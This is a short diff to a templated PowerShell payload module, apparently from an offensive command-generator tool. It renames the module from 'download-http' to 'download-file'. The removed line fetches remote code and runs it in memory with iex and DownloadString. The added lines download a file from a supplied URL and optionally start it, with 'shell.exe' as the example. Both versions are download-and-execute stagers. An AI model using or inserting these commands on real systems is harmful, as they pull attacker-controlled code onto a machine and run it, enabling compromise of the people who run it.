@@ -1,5 +1,5 @@
 ##########
-Name: download-http
+Name: download-file
 Author: Jusmistic
 Description: Download file from url
 Options:
@@ -7,4 +7,5 @@ Options:
     execute: "Execute downloaded file? (Ex. y = yes / n = no)"
     filename: "Filename to execute (Ex:shell.exe)"
 ##########
-iex (New-Object Net.WebClient).DownloadString('{{url}}'{% if execute %}, '{{filename}}'{% endif %});
+(New-Object System.Net.WebClient).DownloadFile('{{url}}', '{{filename}}');
+{% if execute == 'y' %}start .\{{filename}}; {% endif %}
